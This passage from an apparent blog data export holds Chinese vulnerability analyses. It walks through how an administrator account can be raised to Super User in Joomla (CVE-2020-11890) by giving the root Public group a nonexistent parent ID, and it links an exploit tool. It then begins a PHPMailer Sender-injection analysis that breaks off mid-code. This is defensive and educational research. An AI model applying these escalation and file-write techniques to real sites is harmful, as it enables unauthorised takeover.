\"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200428160104-68db5a20-8926-1.png\" alt=\"5f76e4975217d3c58d3733c1201559b7.png\"></p>\n<p>在这一环节，程序将为每一个用户组提供path与level属性值</p>\n<p>其中path属性就是树形结构中以该用户组节点的祖先(Ancestor)数组、level即为该结点的层次(Level<br>of Node)</p>\n<p>回顾一下数据库中每个用户组的属性值，这里注意parent_id值</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200428160138-7d0fb504-8926-1.png\" alt=\"9b80914e36313b90f6c77defc4dbf5fc.png\"></p>\n<p>除了Public父节点为0之外，其他的用户组在表中都存在对应的双亲节点。可见Public用户组为树形结构中的根节点，层次为1。</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200428160156-87604938-8926-1.png\" alt=\"07e4598f33500494dc183fbdb2b39f7e.png\"></p>\n<p>Registered、Manager、Super Users、Guest的双亲节点id皆为1，即Public节点 。层次为2<br>剩余的用户组节点分别以Registered、Manager、Super Users、Guest四个节点作为双亲节点。</p>\n<p>用户节点的树形图如下</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200428160213-91700f1c-8926-1.png\" alt=\"d380e0654c8ff7a223e4070d81c2293e.png\"></p>\n<p>动态调试结果如下</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200428160227-99d3e692-8926-1.png\" alt=\"a8bb90f8b7f5609f6518342305281bcb.png\"></p>\n<p>从上图可见，这里以Public用户组节点举例：Public作为根节点，其path以及level生成时比较特殊，进入parentid为0的if分支，最终祖先数组path为array(0 =&gt; ‘1’)， level为0</p>\n<p>再以Registered、Manager、Super Users、Guest这四个层次为2的用户组节点中的Guest节点为例</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200428160240-a1d0d63e-8926-1.png\" alt=\"be793cbabb3e94b34461a3b6e9965d27.png\"></p>\n<p>Guest节点的path为array (0 =&gt; ‘1’,1 =&gt;‘9’,)，level为1。Path是由Guest节点所有祖先组成的集合，level值为该节点层数减一</p>\n<p>最后看一下其他层次大于2的节点，以Administrator用户组节点举例</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200428160254-aa4b3480-8926-1.png\" alt=\"2e7adc594ec19113eba55f8556eb06a5.png\"></p>\n<p>从数据库中可见，Administrator用户组双亲节点id为6，对应 Manager节点，Manager用户组节点的双亲节点id为1，对应Public用户组节点。其层次为3</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200428160309-b305f574-8926-1.png\" alt=\"442d59b0112f8738a3c73b2db904a579.png\"></p>\n<p>通过调试也可看出，Administrator用户组节点的祖先数组path为array (0 =&gt; ‘1’, 1 =&gt;‘6’, 2 =&gt; ‘7’,)，level为2</p>\n<p>在弄明白groups列表之后，看一下程序是如何判断当前用户的权限判断的</p>\n<p>回到checkGroup方法中</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200428160327-bdc47b52-8926-1.png\" alt=\"cee907a65d171026cfbfd405f9959868.png\"></p>\n<p>上文以及指导getGroupPath方法的作用了，由于我们请求构造中的$groupid为8，即想把test账号添加到id为8对应的super users组。getGroupPath接收传入的$groupid,返回super user节点的祖先数组array (0=&gt; ‘1’, 1 =&gt; ‘8’,)</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200428160339-c50fa8be-8926-1.png\" alt=\"10e711ae91359192c253acec9ba626d1.png\"></p>\n<p>接着，在libraries\\src\\Access\\Rule.php的allow方法中，程序遍历superuser的祖先数组array<br>(0 =&gt; ‘1’, 1 =&gt; ‘8’,)</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200428160354-cdf627fa-8926-1.png\" alt=\"397c10dfa94bb2ffa87f48fb344cb9b7.png\"></p>\n<p>程序判断superuser的祖先节点是否有在$this-&gt;data中出现，$this-&gt;data值如下</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200428160408-d610dbba-8926-1.png\" alt=\"82817b40c91392827b5ad1386f6d3cae.png\"></p>\n<p>$this-&gt;data数组代表目前用户不可以访问的节点id。由于我们使用的是administrator用户组的账号，不可以操作的用户组节点id为8，即super user，因此$this-&gt;data数组值为array (8 =&gt; 1,)</p>\n<p>superuser的祖先数组中的叶子节点值为8，正好在目前用户不可以访问的$this-&gt;data数组中</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200428160424-dfb7d83a-8926-1.png\" alt=\"0e9c21d4f8729213a2a274d86391a653.png\"></p>\n<p>因此该用户权限无法进行操作，程序抛出当前用户不是超级管理员的错误</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200428160438-e845190e-8926-1.png\" alt=\"6b8bb78abb697b27a0170e1123bbfc5b.png\"></p>\n<h2 id=\"漏洞利用\"><a href=\"#漏洞利用\" class=\"headerlink\" title=\"漏洞利用\"></a>漏洞利用</h2><p>通过分析poc发现，这个漏洞利用特别的脑洞大开</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200428160452-f0a439d6-8926-1.png\" alt=\"429dbee5ceb4134d398457d1776b09df.png\"></p>\n<p>首先看一下Poc中上图片段，poc把public节点的双亲节点改成100，当然这个数字可以为表中任意不存在的id值<br>这样做的目的是给原先的根节点public节点安一个双亲节点</p>\n<p>由于administrator权限的用户$this-&gt;data数组值为array (8 =&gt;1,)，仅不允许操作super user权限节点，但public对应的祖先数组array (0 =&gt;‘1’)可不在禁止之列，因此administrator权限的用户可以构造上图poc中的数据包，修改public节点的双亲节点</p>\n<p>public节点的双亲节点由0修改为poc中的100后，造成了很大的混乱</p>\n<p>程序在处理Public用户组时，由于parentId为100，不再进入if ($parentId ===0)分支，然而id为100对应的parentGroup并不存在，导致$parentGroup-&gt;path值为null</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200428160510-fb41c930-8926-1.png\" alt=\"bedc5b065d46f7cf00fa1bb271eab7d7.png\"></p>\n<p>这样以来，array_merge将一个null和一个数组进行拼接,由于array_merge首参不接受null作为参数使得程序产生错误，$group-&gt;path也变成null</p>\n<p>进而由 count($group-&gt;path) – 1得出的level值变为-1（0-1得来）</p>\n<p>由于根节点Public的path为null，使得所有后续用户组节点的path都是基于其双亲节点的path值array_merge计算而来，所以所有节点的祖先数组全都为null</p>\n<p>在检查当前用户无法访问的节点是否在path中时，由于所有节点的path都为null，所有无法将其祖先列表中的节点一一拿出与无法访问节点列表中的值比对，从而得以逃避检查</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200428160523-02f78dae-8927-1.png\" alt=\"f60e313e4cf7cb84392152c47dff3941.png\"></p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200428160857-82c040e4-8927-1.png\" alt=\"f60e313e4cf7cb84392152c47dff3941.png\"></p>\n<p>关于漏洞利用工具可见如下链接：<br><a href=\"https://github.com/HoangKien1020/CVE-2020-11890\">https://github.com/HoangKien1020/CVE-2020-11890</a></p>\n<h2 id=\"题外话\"><a href=\"#题外话\" class=\"headerlink\" title=\"题外话\"></a>题外话</h2><p>在数据库的用户组表中lft和rgt的作用是什么？</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200428160916-8e2139a2-8927-1.png\" alt=\"e0e598b530e7352c394fec5266bf6325.png\"></p>\n<p>从表中可以看到有lft和rgt两列，这两列的目的在于：<br>在树状数据结构中，每一个节点都有一个左右值即lft和rgt。如果右值-左值=1，则代表当前节点为叶子节点；相反，如果右值-左值&gt;1，则代表当前节点有子节点，其他左右值在当前节点左右值之间的节点，即为当前结点的所有子节点。从下图可以很好理解其中关系</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200428162648-00c0b6de-892a-1.png\" alt=\"140a893d06f2836ca567c059990925e0.png\"></p>\n<p>这个漏洞虽然影响不是很大，joomla官方仅仅给出了低危评分，但是这个漏洞分析起来很有意思，顺带复习了下数据结构。</p>\n","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"xxlegend","link":"http://xxlegend.com/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/xxlegend.png"},{"name":"phithon","link":"https://www.leavesongs.com","avatar":"https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&d=mm&r=g"},{"name":"ADOG","link":"http://foreversong.cn/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信图片_20200916153556.jpg"},{"name":"kylingit","link":"https://kylingit.com","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/logo.jpg"},{"name":"tsang","link":"https://jontsang.github.io","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/avatar.png"},{"name":"BlBana","link":"https://drops.blbana.cc","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/Misaka.jpg"},{"name":"ChaBug安全","link":"http://www.chabug.org","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信截图_20200918105651.png"}]}]}},"excerpt":"","more":"<h2 id=\"漏洞简介\"><a href=\"#漏洞简介\" class=\"headerlink\" title=\"漏洞简介\"></a>漏洞简介</h2><p>近日，joomla官方给出了一个安全公告。从公告可知Joomla! CMS versions 2.5.0 - 3.9.16版本在处理用户组时缺少对根用户组的检查，从而导致了一个提权漏洞的产生(CVE-2020-11890)。</p>\n<p>经过我分析之后发现，想要利用这个漏洞，必须先要有一个管理员账号，而这个漏洞的作用仅仅能将管理员提权为超级管理员。</p>\n<p>虽然这个漏洞看起来无比鸡肋，但是分析过程却其乐无穷：既了解joomla是如何实现用户组权限划分，又复习了下数据结构。总体上来说漏洞虽小，但分析过程还是很有研究与记录价值的。</p>\n<h2 id=\"漏洞分析\"><a href=\"#漏洞分析\" class=\"headerlink\" title=\"漏洞分析\"></a>漏洞分析</h2><p>本次漏洞可以将joomla系统中的Administrator用户提权为Super Users。在分析漏洞前，我们来看一下Super Users与Administrator有什么区别：</p>\n<p>超级管理员 (Super Users)：拥有Joomla的所有权限。并且超级管理员只能由另一个超级管理员来创建。</p>\n<p>高级管理员（Administrator）：Administrator没有权限将一个用户升级成超级用户或者编辑一个超级用户、不可以修改Joomla的全局设置，没有权限来改变和安装模板和Joomla的语言文件。</p>\n<p>作为测试，我们新建三个账号，分别为administrator（administrator用户组）、Super User（Super User用户组）、test（administrator用户组）</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200428153306-806f93d0-8922-1.png\" alt=\"54fffed2367d8208a6295e38b5623ed8.png\"></p>\n<p>使用Administrator账号登陆，访问Joomla全局设置链接</p>\n<p>/administrator/index.php?option=com_config</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200428153327-8d03fe1a-8922-1.png\" alt=\"2a2f609df0bd270d060804660fa17480.png\"></p>\n<p>可见Administrator用户组权限不可以访问该功能页面。</p>\n<p>使用Administration账号编辑test账号的用户组</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200428153345-97d442f0-8922-1.png\" alt=\"d0530172f936765cc008a8e8e3a1410f.png\"></p>\n<p>Administrator用户组权限不可以为其他的用户添加super user权限</p>\n<p>使用Superuser账号登陆，访问Joomla全局设置链接</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200428153402-a1ca0772-8922-1.png\" alt=\"2ff54fc05128dca46fb49759eb86b638.png\"></p>\n<p>Superuser权限可以访问Joomla全局设置页面</p>\n<p>使用Superuser账号编辑test账号的用户组</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200428153419-abd77650-8922-1.png\" alt=\"31887c18adb4d3718c33b3b8245436f2.png\"></p>\n<p>可以为test账号添加super user权限</p>\n<h3 id=\"关于漏洞的初步猜测\"><a href=\"#关于漏洞的初步猜测\" class=\"headerlink\" title=\"关于漏洞的初步猜测\"></a>关于漏洞的初步猜测</h3><p>在刚看到漏洞简介时，我猜测会不会是joomla只在前端做了校验，使用Administration账号编辑test账号的用户组时，在前端把super user这个选项卡隐藏起来了，后端并未校验权限，使得漏洞产生。</p>\n<p>为了验证我的猜想，我在修改test用户组时抓包并修改其中的jform[groups]值</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200428153434-b4e893fa-8922-1.png\" alt=\"f0209da75a6809f6aaf7f3916c58770c.png\"></p>\n<p>每一个用户组都有一个id值，这个可以通过数据库中查看得来</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200428153449-bdceba6c-8922-1.png\" alt=\"05b3d888b44dbde56bdffef80985e726.png\"></p>\n<p>因为我需要将test账号改为super users用户组权限，因此需改数据包中jform[groups]值为8</p>\n<p>经过测试发现，这是行不通的</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200428155900-1eb5a748-8926-1.png\" alt=\"ddf163abdd76dfeedcf5d9c7e1d85046.png\"></p>\n<p>在猜想失败之后，只好动态调试一下源代码，看一下joomla是如何进行权限校验的</p>\n<h3 id=\"动态调试\"><a href=\"#动态调试\" class=\"headerlink\" title=\"动态调试\"></a>动态调试</h3><p>既然在上文猜想中，我们强行改包时抛出了个Save failed with the following error: User not Super<br>Administrator错误，那么直接在源代码中找到抛出错误的位置libraries\\src\\User\\User.php</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200428155933-323e580a-8926-1.png\" alt=\"bcf56a673b4558d69adca8eec933d800.png\"></p>\n<p>可见上图中，只要checkGroup方法为真，则进入if分支抛出Save failed with the following error: User not Super Administrator错误</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200428155956-3fcda444-8926-1.png\" alt=\"cee907a65d171026cfbfd405f9959868.png\"></p>\n<p>首先来看下getGroupPath</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200428160012-498072dc-8926-1.png\" alt=\"3d43d94db146c4e04462b69faccd57f5.png\"></p>\n<p>getGroupPath的作用是通过传入的groupid参数，获取要查询的用户组分支中叶子节点所属用户组，并返回到树的根节点。简而言之，就是获取用户组列表——groups列表中对应用户组的path属性值</p>\n<h3 id=\"用户组列表（groups）\"><a href=\"#用户组列表（groups）\" class=\"headerlink\" title=\"用户组列表（groups）\"></a>用户组列表（groups）</h3><p>我们来看下groups列表是什么，是怎么生成的<br>用户组列表（groups）中记录了所有用户组的属性值，包括名称、id、双亲节点信息、该节点的祖先数组</p>\n<p>接下来分析下groups列表是怎么生成的<br>首先，程序从数据库usergroups表中读取每一个用户组的属性值<br>数据库中数据如下</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200428160033-5604c2b0-8926-1.png\" alt=\"05b3d888b44dbde56bdffef80985e726.png\"></p>\n<p>程序读取后赋值到groups数组中</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200428160050-5ff9f72c-8926-1.png\" alt=\"90fdb0beecbb1adb14d78ba4f1ac325e.png\"></p>\n<p>接着调用populateGroupData方法对groups数组中每个用户组数据进行补充</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200428160104-68db5a20-8926-1.png\" alt=\"5f76e4975217d3c58d3733c1201559b7.png\"></p>\n<p>在这一环节，程序将为每一个用户组提供path与level属性值</p>\n<p>其中path属性就是树形结构中以该用户组节点的祖先(Ancestor)数组、level即为该结点的层次(Level<br>of Node)</p>\n<p>回顾一下数据库中每个用户组的属性值，这里注意parent_id值</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200428160138-7d0fb504-8926-1.png\" alt=\"9b80914e36313b90f6c77defc4dbf5fc.png\"></p>\n<p>除了Public父节点为0之外，其他的用户组在表中都存在对应的双亲节点。可见Public用户组为树形结构中的根节点，层次为1。</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200428160156-87604938-8926-1.png\" alt=\"07e4598f33500494dc183fbdb2b39f7e.png\"></p>\n<p>Registered、Manager、Super Users、Guest的双亲节点id皆为1，即Public节点 。层次为2<br>剩余的用户组节点分别以Registered、Manager、Super Users、Guest四个节点作为双亲节点。</p>\n<p>用户节点的树形图如下</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200428160213-91700f1c-8926-1.png\" alt=\"d380e0654c8ff7a223e4070d81c2293e.png\"></p>\n<p>动态调试结果如下</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200428160227-99d3e692-8926-1.png\" alt=\"a8bb90f8b7f5609f6518342305281bcb.png\"></p>\n<p>从上图可见，这里以Public用户组节点举例：Public作为根节点，其path以及level生成时比较特殊，进入parentid为0的if分支，最终祖先数组path为array(0 =&gt; ‘1’)， level为0</p>\n<p>再以Registered、Manager、Super Users、Guest这四个层次为2的用户组节点中的Guest节点为例</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200428160240-a1d0d63e-8926-1.png\" alt=\"be793cbabb3e94b34461a3b6e9965d27.png\"></p>\n<p>Guest节点的path为array (0 =&gt; ‘1’,1 =&gt;‘9’,)，level为1。Path是由Guest节点所有祖先组成的集合，level值为该节点层数减一</p>\n<p>最后看一下其他层次大于2的节点，以Administrator用户组节点举例</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200428160254-aa4b3480-8926-1.png\" alt=\"2e7adc594ec19113eba55f8556eb06a5.png\"></p>\n<p>从数据库中可见，Administrator用户组双亲节点id为6，对应 Manager节点，Manager用户组节点的双亲节点id为1，对应Public用户组节点。其层次为3</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200428160309-b305f574-8926-1.png\" alt=\"442d59b0112f8738a3c73b2db904a579.png\"></p>\n<p>通过调试也可看出，Administrator用户组节点的祖先数组path为array (0 =&gt; ‘1’, 1 =&gt;‘6’, 2 =&gt; ‘7’,)，level为2</p>\n<p>在弄明白groups列表之后，看一下程序是如何判断当前用户的权限判断的</p>\n<p>回到checkGroup方法中</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200428160327-bdc47b52-8926-1.png\" alt=\"cee907a65d171026cfbfd405f9959868.png\"></p>\n<p>上文以及指导getGroupPath方法的作用了，由于我们请求构造中的$groupid为8，即想把test账号添加到id为8对应的super users组。getGroupPath接收传入的$groupid,返回super user节点的祖先数组array (0=&gt; ‘1’, 1 =&gt; ‘8’,)</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200428160339-c50fa8be-8926-1.png\" alt=\"10e711ae91359192c253acec9ba626d1.png\"></p>\n<p>接着，在libraries\\src\\Access\\Rule.php的allow方法中，程序遍历superuser的祖先数组array<br>(0 =&gt; ‘1’, 1 =&gt; ‘8’,)</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200428160354-cdf627fa-8926-1.png\" alt=\"397c10dfa94bb2ffa87f48fb344cb9b7.png\"></p>\n<p>程序判断superuser的祖先节点是否有在$this-&gt;data中出现，$this-&gt;data值如下</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200428160408-d610dbba-8926-1.png\" alt=\"82817b40c91392827b5ad1386f6d3cae.png\"></p>\n<p>$this-&gt;data数组代表目前用户不可以访问的节点id。由于我们使用的是administrator用户组的账号，不可以操作的用户组节点id为8，即super user，因此$this-&gt;data数组值为array (8 =&gt; 1,)</p>\n<p>superuser的祖先数组中的叶子节点值为8，正好在目前用户不可以访问的$this-&gt;data数组中</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200428160424-dfb7d83a-8926-1.png\" alt=\"0e9c21d4f8729213a2a274d86391a653.png\"></p>\n<p>因此该用户权限无法进行操作，程序抛出当前用户不是超级管理员的错误</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200428160438-e845190e-8926-1.png\" alt=\"6b8bb78abb697b27a0170e1123bbfc5b.png\"></p>\n<h2 id=\"漏洞利用\"><a href=\"#漏洞利用\" class=\"headerlink\" title=\"漏洞利用\"></a>漏洞利用</h2><p>通过分析poc发现，这个漏洞利用特别的脑洞大开</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200428160452-f0a439d6-8926-1.png\" alt=\"429dbee5ceb4134d398457d1776b09df.png\"></p>\n<p>首先看一下Poc中上图片段，poc把public节点的双亲节点改成100，当然这个数字可以为表中任意不存在的id值<br>这样做的目的是给原先的根节点public节点安一个双亲节点</p>\n<p>由于administrator权限的用户$this-&gt;data数组值为array (8 =&gt;1,)，仅不允许操作super user权限节点，但public对应的祖先数组array (0 =&gt;‘1’)可不在禁止之列，因此administrator权限的用户可以构造上图poc中的数据包，修改public节点的双亲节点</p>\n<p>public节点的双亲节点由0修改为poc中的100后，造成了很大的混乱</p>\n<p>程序在处理Public用户组时，由于parentId为100，不再进入if ($parentId ===0)分支，然而id为100对应的parentGroup并不存在，导致$parentGroup-&gt;path值为null</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200428160510-fb41c930-8926-1.png\" alt=\"bedc5b065d46f7cf00fa1bb271eab7d7.png\"></p>\n<p>这样以来，array_merge将一个null和一个数组进行拼接,由于array_merge首参不接受null作为参数使得程序产生错误，$group-&gt;path也变成null</p>\n<p>进而由 count($group-&gt;path) – 1得出的level值变为-1（0-1得来）</p>\n<p>由于根节点Public的path为null，使得所有后续用户组节点的path都是基于其双亲节点的path值array_merge计算而来，所以所有节点的祖先数组全都为null</p>\n<p>在检查当前用户无法访问的节点是否在path中时，由于所有节点的path都为null，所有无法将其祖先列表中的节点一一拿出与无法访问节点列表中的值比对，从而得以逃避检查</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200428160523-02f78dae-8927-1.png\" alt=\"f60e313e4cf7cb84392152c47dff3941.png\"></p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200428160857-82c040e4-8927-1.png\" alt=\"f60e313e4cf7cb84392152c47dff3941.png\"></p>\n<p>关于漏洞利用工具可见如下链接：<br><a href=\"https://github.com/HoangKien1020/CVE-2020-11890\">https://github.com/HoangKien1020/CVE-2020-11890</a></p>\n<h2 id=\"题外话\"><a href=\"#题外话\" class=\"headerlink\" title=\"题外话\"></a>题外话</h2><p>在数据库的用户组表中lft和rgt的作用是什么？</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200428160916-8e2139a2-8927-1.png\" alt=\"e0e598b530e7352c394fec5266bf6325.png\"></p>\n<p>从表中可以看到有lft和rgt两列，这两列的目的在于：<br>在树状数据结构中，每一个节点都有一个左右值即lft和rgt。如果右值-左值=1，则代表当前节点为叶子节点；相反，如果右值-左值&gt;1，则代表当前节点有子节点，其他左右值在当前节点左右值之间的节点，即为当前结点的所有子节点。从下图可以很好理解其中关系</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200428162648-00c0b6de-892a-1.png\" alt=\"140a893d06f2836ca567c059990925e0.png\"></p>\n<p>这个漏洞虽然影响不是很大，joomla官方仅仅给出了低危评分，但是这个漏洞分析起来很有意思，顺带复习了下数据结构。</p>\n"},{"title":"PHPMailer漏洞分析","date":"2018-04-08T07:09:22.000Z","top_img":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg","_content":"\n在PHPMailer 5.2.17以及之前版本中，存在着一个高危的任意文件写入漏洞，当攻击者将精心构造的恶意数据分别写入邮件内容以及发件人地址中并传递给使用了相应版本的PHPMailer web应用，就可以导致任意文件写入以及远程代码执行的攻击。<!--more-->\n\n## 影响版本\n\n[PHPMailer &lt; 5.2.18](http://www.baidu.com/link?url=um6oV6dGXX7qAxkU0jIKSwL3xMM0BpZpD_zFniLaJthbs_1A76kSswhsePrMssodFVaf0LrTQgKMY4_CvUV5QK)\n\n## 漏洞分析\n\n在正式的漏洞分析开始前，先来简单介绍下什么是phpmailer。\n\nPHPMailer是一个用于发送电子邮件的php函数包。有的读者会提问，既然php本身提供了一个用于发送邮件的mail函数，通过这个函数可以直接在程序中发送邮件，那么为什么需要PHPMailer呢？\n\nMail函数的语法如下：mail(to,subject,message,headers,parameters)，可见mail函数没法指定一台中继邮件发送服务器（及下图step2中的MDA）的功能，Mail函数需要服务器支持sendmail邮件传输代理程序。除此之外mail()函数也存在着一些其他功能上的不足，因此功能更加强大的PHPMailer函数包便诞生了。\n\n[![](http://blog.nsfocus.net/wp-content/uploads/2017/01/PHP1-300x221.jpg)](http://blog.nsfocus.net/wp-content/uploads/2017/01/PHP1.jpg)\n\n对本次漏洞，先看一下官方有什么改动，可以通过改动来推断出漏洞存在的原因。\n\n如下图所示，本次修复对class.phpmailer.php文件中的mailSend函数进行了改动，函数中的Sender参数进行了过滤。\n\n[![](http://blog.nsfocus.net/wp-content/uploads/2017/01/PHP2-300x86.jpg)](http://blog.nsfocus.net/wp-content/uploads/2017/01/PHP2.jpg)\n\n从上图可以看到，这个mailSend函数会将Sender参数处理后赋值给$params变量，当看到$params这个变量时，一些有经验的读者会想到mail函数第五个参数漏洞！的确没错，这个$params参数最终的确传给了mail函数，如下两张图所示。\n\n[![](http://blog.nsfocus.net/wp-content/uploads/2017/01/PHP3-300x297.jpg)](http://blog.nsfocus.net/wp-content/uploads/2017/01/PHP3.jpg)\n\n也就是说，我们可以通过控制Sender参数的传入，来构造$params参数，从而利用mail函数的一些特性写入后门文件。\n\n既然我们已经确定Sender参数为罪魁祸首，接下来我们追踪如何从外部传入并且控制Sender参数，如下图所示，我们追踪到setFrom函数。在这里，$address的值被赋予$Sender。\n\n[![](http://blog.nsfocus.net/wp-content/uploads/2017/01/PHP4-300x190.jpg)](http://blog.nsfocus.net/wp-content/uploads/2017/01/PHP4.jpg)\n\n这里的$address就是PHPMailer所提供的用来接收邮件发送方地址的参数。在$address赋值给$Sender之前，需要经历一次过滤，如下图所示\n\n[![](http://blog.nsfocus.net/wp-content/uploads/2017/01/PHP5-300x121.jpg)](http://blog.nsfocus.net/wp-content/uploads/2017/01/PHP5.jpg)\n\n如上图所示，不能让红色框里的if语句判定成立，如果成立了，直接return false了，if条件的结构可以简化为(a or (b or c) and d)，在这里我们要确保$this-&gt;validateAddress($address)为真，才可以避免return false的结局，接下来看一下$this-&gt;validateAddress($address)中的代码。\n\n<pre class=\"lang:default decode:true \">public static function validateAddress($address, $patternselect = null)\n{\n    if (is_null($patternselect)) {\n        $patternselect = self::$validator;\n    }\n    if (is_callable($patternselect)) {\n        return call_user_func($patternselect, $address);\n    }\n    //Reject line breaks in addresses; it's valid RFC5322, but not RFC5321\n    if (strpos($address, \"\\n\") !== false or strpos($address, \"\\r\") !== false) {\n        return false;\n    }\n    if (!$patternselect or $patternselect == 'auto') {\n        //Check this constant first so it works when extension_loaded() is disabled by safe mode\n        //Constant was added in PHP 5.2.4\n        if (defined('PCRE_VERSION')) {\n            //This pattern can get stuck in a recursive loop in PCRE &lt;= 8.0.2\n            if (version_compare(PCRE_VERSION, '8.0.3') &gt;= 0) {\n                $patternselect = 'pcre8';\n            } else {\n                $patternselect = 'pcre';\n            }\n        } elseif (function_exists('extension_loaded') and extension_loaded('pcre')) {\n            //Fall back to older PCRE\n            $patternselect = 'pcre';\n        } else {\n            //Filter_var appeared in PHP 5.2.0 and does not require the PCRE extension\n            if (version_compare(PHP_VERSION, '5.2.0') &gt;= 0) {\n                $patternselect = 'php';\n            } else {\n                $patternselect = 'noregex';\n            }\n        }\n    }\n    switch ($patternselect) {\n        case 'pcre8':\n            /**\n             * Uses the same RFC5322 regex on which FILTER_VALIDATE_EMAIL is based, but allows dotless domains.\n             * @link http://squiloople.com/2009/12/20/email-address-validation/\n             * @copyright 2009-2010 Michael Rushton\n             * Feel free to use and redistribute this code. But please keep this copyright notice.\n             */\n            return (boolean)preg_match(\n                '/^(?!(?&gt;(?1)\"?(?&gt;\\\\\\[ -~]|[^\"])\"?(?1)){255,})(?!(?&gt;(?1)\"?(?&gt;\\\\\\[ -~]|[^\"])\"?(?1)){65,}@)' .\n                '((?&gt;(?&gt;(?&gt;((?&gt;(?&gt;(?&gt;\\x0D\\x0A)?[\\t ])+|(?&gt;[\\t ]*\\x0D\\x0A)?[\\t ]+)?)(\\((?&gt;(?2)' .\n                '(?&gt;[\\x01-\\x08\\x0B\\x0C\\x0E-\\'*-\\[\\]-\\x7F]|\\\\\\[\\x00-\\x7F]|(?3)))*(?2)\\)))+(?2))|(?2))?)' .\n                '([!#-\\'*+\\/-9=?^-~-]+|\"(?&gt;(?2)(?&gt;[\\x01-\\x08\\x0B\\x0C\\x0E-!#-\\[\\]-\\x7F]|\\\\\\[\\x00-\\x7F]))*' .\n                '(?2)\")(?&gt;(?1)\\.(?1)(?4))*(?1)@(?!(?1)[a-z0-9-]{64,})(?1)(?&gt;([a-z0-9](?&gt;[a-z0-9-]*[a-z0-9])?)' .\n                